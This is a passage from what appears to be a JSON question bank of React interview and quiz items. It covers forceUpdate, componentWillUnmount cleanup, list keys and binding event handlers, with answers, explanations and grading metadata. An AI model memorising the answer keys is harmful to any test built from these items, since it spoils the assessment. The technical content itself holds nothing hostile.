          "answer": "In a scenario where a React component relies on data managed by a third-party library that doesn't trigger React's update cycle (i.e., doesn't update component props or state directly), `this.forceUpdate()` might be used. For example, if the library directly manipulates the DOM or maintains its own data store without providing a mechanism to subscribe to changes or integrate with React's state management, `forceUpdate()` could be used to manually trigger a re-render when the external data changes.\n\n**Potential Drawbacks of `forceUpdate`:**\n1.  **Bypasses Optimization**: `forceUpdate()` skips `shouldComponentUpdate()`, which is a key optimization point in React. This means even if the component's visible output hasn't actually changed, it will still re-render, potentially leading to unnecessary computations and performance degradation.\n2.  **Loss of Control**: It breaks React's predictable data flow and reconciliation process, making debugging harder as updates are no longer solely tied to prop/state changes.\n3.  **Performance Overhead**: Frequent calls to `forceUpdate()` can lead to poor performance, especially in complex component trees, as it forces re-renders of the component and its children without React's usual diffing optimizations.\n4.  **Difficult to Maintain**: Code that relies on `forceUpdate` can be harder to understand and maintain, as the reasons for re-renders are less explicit.\n\n**Alternative, More React-Idiomatic Approaches:**\n1.  **Wrapper Component with Internal State**: Create a wrapper React component that subscribes to the third-party library's data changes. When the library notifies of a change (if it offers a subscription API), the wrapper component can update its *own* state using `this.setState()`. This state change will then trigger a re-render of the wrapper and its children, allowing data to flow through React's prop/state mechanism.\n2.  **Context API or Redux-like Store**: For more complex data needs, encapsulate the third-party library within a React Context Provider or a Redux store. The library's data updates can then trigger updates to the Context value or Redux store, which React components can consume, leading to efficient, granular re-renders.\n3.  **Refactoring/Revisiting the Third-Party Integration**: Ideally, the integration with any external library should involve methods that allow React components to react to data changes using `setState` or `useState` hooks (for functional components). This might involve writing a custom hook or higher-order component (HOC) that abstracts away the library's specifics and exposes data as React state/props.\n\nIn essence, `forceUpdate` is a blunt instrument. While it can solve immediate problems, it often indicates an underlying architectural challenge in integrating external systems with React's declarative nature.",
          "options": [],
          "analysisPoints": [
            "Evaluates understanding of `forceUpdate`'s role and limitations.",
            "Tests ability to identify and articulate performance and maintainability drawbacks.",
            "Requires suggesting and explaining more appropriate React patterns for integration scenarios."
          ],
          "keyConcepts": [
            "forceUpdate()",
            "React reconciliation",
            "Performance optimization",
            "External data integration",
            "State management",
            "Context API",
            "Third-party libraries"
          ],
          "evaluationCriteria": [
            "Depth of knowledge regarding `forceUpdate`.",
            "Ability to critically analyze architectural design choices.",
            "Proficiency in proposing and explaining alternative React patterns.",
            "Understanding of React's core principles (declarative UI, data flow)."
          ],
          "example": "",
          "tags": [
            "React",
            "forceUpdate",
            "performance",
            "architecture",
            "state-management",
            "open-ended"
          ],
          "prerequisites": [
            "react_lifecycle_methods",
            "react_state_management",
            "react_performance_optimization"
          ],
          "complexity": 8,
          "interviewFrequency": 6,
          "learningPath": "advanced"
        },
        {
          "id": "question_re_render_flashcard_4",
          "topic": "Re-rendering and `shouldComponentUpdate`",
          "level": "medium",
          "type": "flashcard",
          "question": "Does `this.forceUpdate()` call `shouldComponentUpdate()`?",
          "answer": "No, `this.forceUpdate()` bypasses `shouldComponentUpdate()` for the component on which it is called.",
          "options": [],
          "analysisPoints": [
            "Tests recall of a specific behavior of `forceUpdate`.",
            "Reinforces the understanding of `shouldComponentUpdate`'s role in optimization."
          ],
          "keyConcepts": [
            "forceUpdate()",
            "shouldComponentUpdate()",
            "React lifecycle"
          ],
          "evaluationCriteria": [
            "Accuracy of recall.",
            "Conciseness of answer."
          ],
          "example": "",
          "tags": [
            "React",
            "forceUpdate",
            "shouldComponentUpdate",
            "lifecycle",
            "flashcard"
          ],
          "prerequisites": [
            "react_lifecycle_methods"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_re_render_mcq_5",
          "topic": "React Re-rendering Triggers and `setState`",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following actions will trigger a re-render of a React class component?\n\nI. A parent component passes new props to the component.\nII. The component's internal state is updated using `this.setState()`.\nIII. A direct DOM manipulation is performed on the component's root element.\nIV. `this.forceUpdate()` is explicitly called on the component instance.",
          "answer": "I, II, and IV only",
          "options": [
            "I and II only",
            "I, II, and III only",
            "I, II, and IV only",
            "All of the above"
          ],
          "analysisPoints": [
            "Tests comprehensive understanding of React's re-rendering mechanisms.",
            "Distinguishes between React's declarative updates and direct imperative DOM manipulation."
          ],
          "keyConcepts": [
            "React re-rendering",
            "Props update",
            "State update",
            "setState()",
            "forceUpdate()",
            "DOM manipulation"
          ],
          "evaluationCriteria": [
            "Accuracy in identifying valid re-render triggers.",
            "Understanding of React's control over the DOM vs. external manipulation."
          ],
          "example": "Options I and II are the standard, most common ways React components re-render. Option IV is an explicit, less common way to force a re-render. Option III, direct DOM manipulation, is outside of React's control and will not trigger a React re-render. React's virtual DOM would not be aware of such a change and the component's internal representation would become out of sync with the actual DOM.",
          "tags": [
            "React",
            "re-render",
            "props",
            "state",
            "setState",
            "forceUpdate",
            "mcq"
          ],
          "prerequisites": [
            "react_component_basics"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_component_will_unmount_1",
          "topic": "`componentWillUnmount` Cleanup",
          "level": "easy",
          "type": "open",
          "question": "Why is `componentWillUnmount` important in React class components?",
          "answer": "`componentWillUnmount` is crucial for performing cleanup operations before a component is removed from the DOM. This prevents memory leaks and ensures that resources are properly released, maintaining application performance and stability.",
          "options": [],
          "analysisPoints": [
            "Identifies the core purpose of `componentWillUnmount`.",
            "Highlights the consequence of not performing cleanup (memory leaks)."
          ],
          "keyConcepts": [
            "componentWillUnmount",
            "Cleanup",
            "Memory leaks",
            "Lifecycle methods"
          ],
          "evaluationCriteria": [
            "Understanding the fundamental reason for using the method."
          ],
          "example": "",
          "tags": [
            "React",
            "lifecycle",
            "componentWillUnmount",
            "cleanup",
            "open-ended"
          ],
          "prerequisites": [
            "react_lifecycle_basics"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_component_will_unmount_2",
          "topic": "Actions in `componentWillUnmount`",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following operations is typically recommended to be performed within the `componentWillUnmount` lifecycle method of a React class component?\n\nA) Initializing state from props.\nB) Making initial API calls to fetch data.\nC) Setting up global event listeners.\nD) Clearing timers set with `setInterval`.",
          "answer": "D) Clearing timers set with `setInterval`.",
          "options": [
            "A) Initializing state from props.",
            "B) Making initial API calls to fetch data.",
            "C) Setting up global event listeners.",
            "D) Clearing timers set with `setInterval`."
          ],
          "analysisPoints": [
            "Tests knowledge of appropriate actions for `componentWillUnmount`.",
            "Distinguishes `componentWillUnmount` from other lifecycle phases (`constructor`, `componentDidMount`)."
          ],
          "keyConcepts": [
            "componentWillUnmount",
            "Cleanup",
            "Timers",
            "Event listeners",
            "API calls",
            "Lifecycle methods"
          ],
          "evaluationCriteria": [
            "Correctly identifying cleanup tasks.",
            "Understanding the purpose of different lifecycle methods."
          ],
          "example": "Initializing state from props (A) is done in the constructor or using `static getDerivedStateFromProps`. Making initial API calls (B) and setting up global event listeners (C) are typically done in `componentDidMount`. Clearing timers (D) is a classic cleanup operation, precisely what `componentWillUnmount` is for.",
          "tags": [
            "React",
            "lifecycle",
            "componentWillUnmount",
            "cleanup",
            "timers",
            "mcq"
          ],
          "prerequisites": [
            "react_lifecycle_methods"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_component_will_unmount_3",
          "topic": "`componentWillUnmount` and Event Listeners",
          "level": "hard",
          "type": "code",
          "question": "You have a React class component that displays the current window width and updates it on resize. Complete the component to correctly add and remove the resize event listener to prevent memory leaks.\n\n```javascript\nimport React from 'react';\n\nclass WindowResizer extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { width: window.innerWidth };\n  }\n\n  handleResize = () => {\n    this.setState({ width: window.innerWidth });\n  };\n\n  // Add lifecycle method to attach listener\n\n  // Add lifecycle method to remove listener\n\n  render() {\n    return (\n      <div>\n        <p>Window width: {this.state.width}px</p>\n        <p>Resize your browser window.</p>\n      </div>\n    );\n  }\n}\n```",
          "answer": "```javascript\nimport React from 'react';\n\nclass WindowResizer extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { width: window.innerWidth };\n  }\n\n  handleResize = () => {\n    this.setState({ width: window.innerWidth });\n  };\n\n  componentDidMount() {\n    // Add event listener when component mounts\n    window.addEventListener('resize', this.handleResize);\n  }\n\n  componentWillUnmount() {\n    // Remove event listener when component unmounts\n    window.removeEventListener('resize', this.handleResize);\n  }\n\n  render() {\n    return (\n      <div>\n        <p>Window width: {this.state.width}px</p>\n        <p>Resize your browser window.</p>\n      </div>\n    );\n  }\n}\n```",
          "options": [],
          "analysisPoints": [
            "Tests practical application of `componentDidMount` and `componentWillUnmount`.",
            "Emphasizes the importance of pairing listener attachment and removal.",
            "Assesses understanding of common memory leak prevention techniques."
          ],
          "keyConcepts": [
            "componentDidMount",
            "componentWillUnmount",
            "Event listeners",
            "Memory leaks",
            "Lifecycle methods",
            "Class components"
          ],
          "evaluationCriteria": [
            "Correct implementation of lifecycle methods.",
            "Proper attachment and detachment of global event listeners.",
            "Demonstrates understanding of cleanup necessity."
          ],
          "example": "The event listener is added in `componentDidMount` because that's when the component is available in the DOM. It's then crucial to remove it in `componentWillUnmount` to prevent the listener from remaining active after the component is unmounted, which would lead to a memory leak and potential errors if it tries to access the state of a non-existent component.",
          "tags": [
            "React",
            "lifecycle",
            "componentWillUnmount",
            "componentDidMount",
            "event-listeners",
            "memory-leaks",
            "code"
          ],
          "prerequisites": [
            "react_lifecycle_methods",
            "javascript_event_listeners"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_component_will_unmount_flashcard_4",
          "topic": "Purpose of `componentWillUnmount`",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the `componentWillUnmount` lifecycle method?",
          "answer": "To perform any necessary cleanup before a component is unmounted and destroyed.",
          "options": [],
          "analysisPoints": [
            "Tests basic recall of the method's function."
          ],
          "keyConcepts": [
            "componentWillUnmount",
            "Cleanup",
            "Lifecycle methods"
          ],
          "evaluationCriteria": [
            "Accuracy and conciseness."
          ],
          "example": "",
          "tags": [
            "React",
            "lifecycle",
            "componentWillUnmount",
            "flashcard"
          ],
          "prerequisites": [
            "react_lifecycle_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_component_will_unmount_mcq_5",
          "topic": "Unnecessary Call in `componentWillUnmount`",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following actions is generally **NOT** necessary or recommended within `componentWillUnmount`?\n\nA) Canceling pending network requests.\nB) Removing subscriptions to external data sources.\nC) Calling `this.setState()` to update the component's state.\nD) Clearing `setTimeout` or `setInterval` calls.",
          "answer": "C) Calling `this.setState()` to update the component's state.",
          "options": [
            "A) Canceling pending network requests.",
            "B) Removing subscriptions to external data sources.",
            "C) Calling `this.setState()` to update the component's state.",
            "D) Clearing `setTimeout` or `setInterval` calls."
          ],
          "analysisPoints": [
            "Tests understanding of what `componentWillUnmount` is *not* for.",
            "Highlights the component's state after unmounting is initiated."
          ],
          "keyConcepts": [
            "componentWillUnmount",
            "Cleanup",
            "setState()",
            "Memory leaks",
            "Lifecycle methods"
          ],
          "evaluationCriteria": [
            "Ability to distinguish appropriate from inappropriate actions.",
            "Understanding of component lifecycle phases."
          ],
          "example": "`componentWillUnmount` is called just before the component is unmounted, meaning it will no longer be part of the DOM. Attempting to call `this.setState()` at this point would be pointless as the component is about to be destroyed, and React would likely issue a warning about updating an unmounted component. The other options (A, B, D) are all crucial cleanup tasks to prevent memory leaks and ensure proper resource management.",
          "tags": [
            "React",
            "lifecycle",
            "componentWillUnmount",
            "cleanup",
            "setState",
            "mcq"
          ],
          "prerequisites": [
            "react_lifecycle_methods"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_keys_1",
          "topic": "Importance of Keys in React Lists",
          "level": "easy",
          "type": "open",
          "question": "Why are keys important when rendering lists in React?",
          "answer": "Keys help React identify which elements in a list have changed, been added, or removed. They provide a stable identity to elements across re-renders, which is crucial for React's reconciliation algorithm to efficiently update the UI and maintain component state.",
          "options": [],
          "analysisPoints": [
            "Explains the core function of keys.",
            "Connects keys to React's reconciliation process and efficiency."
          ],
          "keyConcepts": [
            "React keys",
            "Lists",
            "Reconciliation",
            "Performance",
            "Virtual DOM"
          ],
          "evaluationCriteria": [
            "Clear and concise explanation of key purpose."
          ],
          "example": "",
          "tags": [
            "React",
            "keys",
            "lists",
            "reconciliation",
            "performance",
            "open-ended"
          ],
          "prerequisites": [
            "react_component_rendering"
          ],
          "complexity": 4,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_keys_2",
          "topic": "Problems with Index as Keys",
          "level": "medium",
          "type": "code",
          "question": "Consider the following React component that uses array index as a key:\n\n```javascript\nimport React, { useState } from 'react';\n\nfunction ShoppingList() {\n  const [items, setItems] = useState([\n    { id: 1, name: 'Milk', quantity: 1 },\n    { id: 2, name: 'Eggs', quantity: 12 },\n    { id: 3, name: 'Bread', quantity: 1 },\n  ]);\n\n  const addItem = () => {\n    const newItem = { id: Date.now(), name: 'New Item', quantity: 1 };\n    setItems([newItem, ...items]); // Add to the beginning\n  };\n\n  const removeItem = (idToRemove) => {\n    setItems(items.filter(item => item.id !== idToRemove));\n  };\n\n  return (\n    <div>\n      <button onClick={addItem}>Add New Item to Start</button>\n      <ul>\n        {items.map((item, index) => (\n          <li key={index}>\n            <input type=\"text\" defaultValue={item.name} />\n            <input type=\"number\" defaultValue={item.quantity} />\n            <button onClick={() => removeItem(item.id)}>Remove</button>\n          </li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n```\n\nExplain the potential issues with using `index` as the `key` in this scenario, especially after adding a new item to the beginning of the list. How would you fix this code to adhere to React's best practices for keys?",
          "answer": "### Potential Issues with `index` as `key`:\nWhen a new item is added to the beginning of the `items` array, the indices of all subsequent items shift. For example, the item that was at `index=0` (Milk) moves to `index=1`, Eggs from `index=1` to `index=2`, and so on. Since React uses the `key` to identify components, it perceives the component at `key=0` as a *new* component, and the component previously at `key=0` is now associated with `key=1`, etc. Instead of updating the existing components, React will effectively:\n1.  Create a new component for the new item at `key=0`.\n2.  Reuse the component previously at `key=0` for `key=1`, the component previously at `key=1` for `key=2`, and so on.\n\nThis leads to problems such as:\n*   **Incorrect State Preservation**: If users had typed values into the `input` fields for 'Milk' or 'Eggs', those values would 'jump' to the wrong item when a new item is added at the start. The `input` for 'Milk' (original index 0) would now display the text typed into the 'Eggs' input (original index 1), and so on, because React reuses the component instance based on the key, not the content.\n*   **Performance Issues**: React cannot efficiently determine which items have truly changed. It might re-render more components than necessary or perform unnecessary DOM manipulations instead of simply inserting the new item.\n*   **Bugs**: Could lead to unexpected behavior, especially with complex components that manage their own internal state or have side effects.\n\n### Fix to Adhere to Best Practices:\nTo fix this, use a stable, unique identifier from your data as the key, such as the `id` property of each item.\n\n```javascript\nimport React, { useState } from 'react';\n\nfunction ShoppingList() {\n  const [items, setItems] = useState([\n    { id: 1, name: 'Milk', quantity: 1 },\n    { id: 2, name: 'Eggs', quantity: 12 },\n    { id: 3, name: 'Bread', quantity: 1 },\n  ]);\n\n  const addItem = () => {\n    const newItem = { id: Date.now(), name: 'New Item', quantity: 1 };\n    setItems([newItem, ...items]); // Add to the beginning\n  };\n\n  const removeItem = (idToRemove) => {\n    setItems(items.filter(item => item.id !== idToRemove));\n  };\n\n  return (\n    <div>\n      <button onClick={addItem}>Add New Item to Start</button>\n      <ul>\n        {items.map((item) => (\n          <li key={item.id}> {/* Fix: Use item.id as the key */}\n            <input type=\"text\" defaultValue={item.name} />\n            <input type=\"number\" defaultValue={item.quantity} />\n            <button onClick={() => removeItem(item.id)}>Remove</button>\n          </li>\n        ))}\n      </ul>\n    </div>\n  );\n}\n```",
          "options": [],
          "analysisPoints": [
            "Identifies the root cause of issues with index keys when list order changes.",
            "Explains the impact on state preservation and performance.",
            "Provides a correct, React-idiomatic solution using unique IDs.",
            "Demonstrates understanding of React's reconciliation algorithm."
          ],
          "keyConcepts": [
            "React keys",
            "Index as key",
            "Reconciliation",
            "State preservation",
            "Performance optimization",
            "Unique identifiers"
          ],
          "evaluationCriteria": [
            "Accuracy of problem explanation.",
            "Correctness of the proposed solution.",
            "Clarity in connecting `key` usage to React's internal mechanisms."
          ],
          "example": "To observe the issue: run the original code, type different values into the 'Milk' and 'Eggs' inputs. Then click 'Add New Item to Start'. You'll notice the typed values shift to the wrong items. After applying the fix, the inputs will correctly stay associated with their original items.",
          "tags": [
            "React",
            "keys",
            "lists",
            "reconciliation",
            "performance",
            "code",
            "best-practices"
          ],
          "prerequisites": [
            "react_component_rendering",
            "react_state_hooks"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_keys_3",
          "topic": "React Keys Properties",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following statements about React keys is **FALSE**?\n\nA) Keys must be unique among siblings in a list.\nB) Keys should be stable across renders for the same item.\nC) Keys are passed as props to the component they are assigned to.\nD) Using an array index as a key can be problematic if the list order changes.",
          "answer": "C) Keys are passed as props to the component they are assigned to.",
          "options": [
            "A) Keys must be unique among siblings in a list.",
            "B) Keys should be stable across renders for the same item.",
            "C) Keys are passed as props to the component they are assigned to.",
            "D) Using an array index as a key can be problematic if the list order changes."
          ],
          "analysisPoints": [
            "Tests comprehensive knowledge of React key rules and common misconceptions.",
            "Clarifies the internal nature of the `key` prop."
          ],
          "keyConcepts": [
            "React keys",
            "Unique keys",
            "Stable keys",
            "Index as key",
            "Props",
            "Reconciliation"
          ],
          "evaluationCriteria": [
            "Accuracy in identifying false statements about React keys.",
            "Understanding of the internal handling of keys by React."
          ],
          "example": "Statement C is false. Keys are a special attribute used by React internally for reconciliation and are not accessible within the component itself via `this.props.key` (for class components) or `props.key` (for functional components). If you need to access the unique identifier within the component, you should pass it as a separate prop (e.g., `<ListItem id={item.id} key={item.id} />`).",
          "tags": [
            "React",
            "keys",
            "lists",
            "mcq",
            "best-practices"
          ],
          "prerequisites": [
            "react_component_rendering"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_keys_flashcard_4",
          "topic": "React Keys Best Practice",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the recommended source for a React key when rendering dynamic lists?",
          "answer": "A unique and stable identifier from your data (e.g., a database ID or UUID).",
          "options": [],
          "analysisPoints": [
            "Tests recall of the best practice for key selection.",
            "Emphasizes stability and uniqueness."
          ],
          "keyConcepts": [
            "React keys",
            "Best practices",
            "Unique ID",
            "Stable key"
          ],
          "evaluationCriteria": [
            "Accuracy and conciseness of the answer."
          ],
          "example": "",
          "tags": [
            "React",
            "keys",
            "lists",
            "flashcard",
            "best-practices"
          ],
          "prerequisites": [
            "react_component_rendering"
          ],
          "complexity": 4,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_keys_mcq_5",
          "topic": "Key Uniqueness Scope",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following React components:\n\n```javascript\nfunction ParentComponent() {\n  const items1 = [{ id: 1, text: 'A' }, { id: 2, text: 'B' }];\n  const items2 = [{ id: 1, text: 'X' }, { id: 2, text: 'Y' }];\n\n  return (\n    <div>\n      <ul>\n        {items1.map(item => (\n          <li key={item.id}>{item.text}</li>\n        ))}\n      </ul>\n      <ol>\n        {items2.map(item => (\n          <li key={item.id}>{item.text}</li>\n        ))}\n      </ol>\n    </div>\n  );\n}\n```\n\nIs the usage of `key={item.id}` for both lists `items1` and `items2` valid and without potential issues?",
          "answer": "Yes, it is valid because keys only need to be unique among siblings.",
          "options": [
            "No, it's invalid because keys must be globally unique across the entire application.",
            "No, it's invalid because `id: 1` and `id: 2` are duplicated across the two lists.",
            "Yes, it is valid because keys only need to be unique among siblings.",
            "Yes, but only if `items1` and `items2` are always rendered conditionally, never at the same time."
          ],
          "analysisPoints": [
            "Tests understanding of the scope of key uniqueness.",
            "Clarifies that keys are unique within a specific list, not globally."
          ],
          "keyConcepts": [
            "React keys",
            "Key uniqueness",
            "Siblings",
            "Lists"
          ],
          "evaluationCriteria": [
            "Correctly identifying the scope of key uniqueness.",
            "Understanding React's internal handling of keys."
          ],
          "example": "Keys only need to be unique among *siblings*. In this example, the `ul` and `ol` lists are distinct sets of siblings. The `<li>` elements within the `<ul>` are siblings to each other, and the `<li>` elements within the `<ol>` are siblings to each other. Therefore, `id: 1` and `id: 2` are unique within their respective `ul` and `ol` parents, making this a valid and correct use of keys.",
          "tags": [
            "React",
            "keys",
            "lists",
            "mcq"
          ],
          "prerequisites": [
            "react_component_rendering"
          ],
          "complexity": 7,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_binding_handlers_1",
          "topic": "Binding Event Handlers in Class Components",
          "level": "easy",
          "type": "open",
          "question": "Why do we need to bind event handlers in React class components?",
          "answer": "Binding methods to the component instance is necessary to maintain the correct `this` context. In JavaScript, when a class method is used as an event handler callback, `this` inside that method would by default be `undefined` (in strict mode) or refer to the event target/global object. Binding ensures `this` correctly refers to the component instance, allowing access to `this.state`, `this.props`, and `this.setState()`.",
          "options": [],
          "analysisPoints": [
            "Explains the JavaScript `this` context issue.",
            "Connects the problem directly to accessing component properties/methods."
          ],
          "keyConcepts": [
            "this context",
            "Event handlers",
            "Binding",
            "Class components",
            "JavaScript"
          ],
          "evaluationCriteria": [
            "Clear explanation of `this` context problem.",
            "Understanding of why binding is a solution."
          ],
          "example": "",
          "tags": [
            "React",
            "event-handlers",
            "binding",
            "this-context",
            "class-components",
            "open-ended"
          ],
          "prerequisites": [
            "javascript_this_context",
            "react_class_components"
          ],
          "complexity": 5,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_binding_handlers_2",
          "topic": "Binding Methods - Best Practice",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following is considered the most performant and idiomatic way to bind an event handler method in a React class component?\n\nA) Binding in the render method using `this.handleClick.bind(this)`.\nB) Defining the method using an arrow function as a class property (`handleClick = () => { ... }`).\nC) Binding in the render method using an arrow function `onClick={() => this.handleClick()}`.\nD) Not binding at all, expecting React to handle `this` automatically.",
          "answer": "B) Defining the method using an arrow function as a class property (`handleClick = () => { ... }`).",
          "options": [
            "A) Binding in the render method using `this.handleClick.bind(this)`.",
            "B) Defining the method using an arrow function as a class property (`handleClick = () => { ... }`).",
            "C) Binding in the render method using an arrow function `onClick={() => this.handleClick()}`.",
            "D) Not binding at all, expecting React to handle `this` automatically."
          ],
          "analysisPoints": [
            "Tests knowledge of different binding approaches and their performance implications.",
            "Identifies the modern best practice for binding in class components."
          ],
          "keyConcepts": [
            "Binding",
            "this context",
            "Arrow functions",
            "Class properties",
            "Performance optimization",
            "Class components"
          ],
          "evaluationCriteria": [
            "Correctly identifies the recommended binding method.",
            "Understanding of why other methods are less ideal (performance)."
          ],
          "example": "Options A and C create a new function on every render, which can lead to performance issues and negatively affect `shouldComponentUpdate` optimizations. Option D is incorrect as `this` context would be lost without binding. Option B, using an arrow function as a class property, is the preferred modern approach because arrow functions lexically bind `this` (they capture `this` from their surrounding context) and the function is created only once when the component instance is created, not on every render.",
          "tags": [
            "React",
            "event-handlers",
            "binding",
            "performance",
            "best-practices",
            "class-components",
            "mcq"
          ],
          "prerequisites": [
            "javascript_this_context",
            "javascript_arrow_functions"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_binding_handlers_3",
          "topic": "Correcting `this` Context Issue",
          "level": "medium",
          "type": "code",
          "question": "The following React class component aims to update its state based on input changes, but it has a `this` context issue. Fix the `onInputChange` method so that `this.setState` can be called correctly.\n\n```javascript\nimport React from 'react';\n\nclass DataInput extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { data: '' };\n  }\n\n  onInputChange(e) {\n    // Problem: 'this' is undefined here\n    this.setState({ data: e.currentTarget.value });\n  }\n\n  render() {\n    return (\n      <div>\n        <input type=\"text\" onChange={this.onInputChange} value={this.state.data} />\n        <p>Input: {this.state.data}</p>\n      </div>\n    );\n  }\n}\n```",
          "answer": "```javascript\nimport React from 'react';\n\nclass DataInput extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { data: '' };\n    // Fix 1: Bind in the constructor\n    this.onInputChange = this.onInputChange.bind(this);\n  }\n\n  onInputChange(e) {\n    this.setState({ data: e.currentTarget.value });\n  }\n\n  render() {\n    return (\n      <div>\n        <input type=\"text\" onChange={this.onInputChange} value={this.state.data} />\n        <p>Input: {this.state.data}</p>\n      </div>\n    );\n  }\n}\n\n// Alternative Fix 2: Use arrow function as class property\n/*\nclass DataInput extends React.Component {\n  state = { data: '' }; // Modern way to declare state\n\n  onInputChange = (e) => {\n    this.setState({ data: e.currentTarget.value });\n  };\n\n  render() {\n    return (\n      <div>\n        <input type=\"text\" onChange={this.onInputChange} value={this.state.data} />\n        <p>Input: {this.state.data}</p>\n      </div>\n    );\n  }\n}\n*/\n```",
          "options": [],
          "analysisPoints": [
            "Tests ability to diagnose and fix `this` context issues in React.",
            "Demonstrates knowledge of common binding patterns.",
            "Provides alternative solutions."
          ],
          "keyConcepts": [
            "this context",
            "Binding",
            "Constructor binding",
            "Arrow functions",
            "Class properties",
            "Event handlers"
          ],
          "evaluationCriteria": [
            "Correctly implements a binding solution.",
            "Understanding of why the original code fails.",
            "Familiarity with multiple binding approaches."
          ],
          "example": "The original `onInputChange` method loses its `this` context when passed as a callback to `onChange`. The most common and performant fixes are either binding it explicitly in the constructor (as shown in Fix 1) or defining it as an arrow function class property (as shown in Alternative Fix 2), which lexically binds `this`.",
          "tags": [
            "React",
            "event-handlers",
            "binding",
            "this-context",
            "code",
            "class-components"
          ],
          "prerequisites": [
            "javascript_this_context",
            "react_class_components"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_binding_handlers_flashcard_4",
          "topic": "Binding `this` in JavaScript",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary reason for `this` context issues when passing class methods as event handlers in JavaScript?",
          "answer": "The way a function is called determines its `this` context. When a class method is passed as a callback, it loses its original binding to the class instance.",
          "options": [],
          "analysisPoints": [
            "Tests understanding of JavaScript's `this` binding rules.",
            "Relates `this` behavior to callback scenarios."
          ],
          "keyConcepts": [
            "this context",
            "JavaScript functions",
            "Callbacks",
            "Event handlers"
          ],
          "evaluationCriteria": [
            "Accuracy of `this` context explanation."
          ],
          "example": "",
          "tags": [
            "JavaScript",
            "this-context",
            "binding",
            "flashcard"
          ],
          "prerequisites": [
            "javascript_this_context"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_binding_handlers_mcq_5",
          "topic": "Impact of Incorrect Binding",
          "level": "medium",
          "type": "mcq",
          "question": "A React class component has a button with an `onClick` handler. If the handler method `handleClick` is NOT bound to the component instance, what will happen when the button is clicked and `handleClick` tries to call `this.setState`?\n\n```javascript\nclass MyComponent extends React.Component {\n  state = { count: 0 };\n\n  handleClick() {\n    console.log(this); // What will 'this' be here?\n    this.setState({ count: this.state.count + 1 }); // This line will cause an error\n  }\n\n  render() {\n    return (\n      <button onClick={this.handleClick}>Increment</button>\n    );\n  }\n}\n```",
          "answer": "An error will occur because `this` will be `undefined` (in strict mode) or refer to the button element.",
          "options": [
            "The state will update successfully, as React automatically binds event handlers.",
            "An error will occur because `this` will be `undefined` (in strict mode) or refer to the button element.",
            "The component will re-render, but `this.state` will not be updated.",
            "The `handleClick` method will not be called at all."
          ],
          "analysisPoints": [
            "Tests understanding of the direct consequence of unbound `this` in a React event handler.",
            "Reinforces the necessity of binding for state manipulation."
          ],
          "keyConcepts": [
            "this context",
            "Binding",
            "setState()",
            "Event handlers",
            "Strict mode"
          ],
          "evaluationCriteria": [
            "Correctly predicts the runtime behavior and error.",
            "Demonstrates knowledge of JavaScript `this` rules in React context."
          ],
          "example": "In a modern React environment (which runs in strict mode), `this` inside an unbound `handleClick` method will be `undefined`. Attempting to access properties like `this.state` or methods like `this.setState()` on `undefined` will result in a TypeError, crashing the application. In non-strict mode, `this` would refer to the global object or the element that triggered the event, still leading to an error for `this.setState` as it's not a function on those objects.",
          "tags": [
            "React",
            "event-handlers",
            "binding",
            "this-context",
            "mcq",
            "error-handling"
          ],
          "prerequisites": [
            "javascript_this_context",
            "react_class_components"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_re_render_simulation",
          "title": "Simulate Re-rendering Behavior",
          "description": "\nCreate a React class component that demonstrates the three different ways a component can be re-rendered: changing props, updating state, and using `forceUpdate()`. \n\n**Requirements:**\n1.  The component should display a simple text or number that updates on re-render (e.g., current timestamp or a counter).\n2.  Include a button that, when clicked, updates the component's internal state via `this.setState()`, triggering a re-render.\n3.  Include another button that explicitly calls `this.forceUpdate()`, triggering a re-render regardless of state/prop changes.\n4.  Demonstrate prop change re-rendering by having a parent component pass a changing prop to your component.\n5.  Add `console.log` statements in the `render` method and in the `forceUpdate` handler to visibly confirm when `render` is called and when `forceUpdate` is triggered.\n6.  (Optional but recommended for advanced understanding) Implement `shouldComponentUpdate` to return `false` for certain conditions, and observe how `forceUpdate` bypasses it while `setState` does not.",
          "difficulty": "medium",
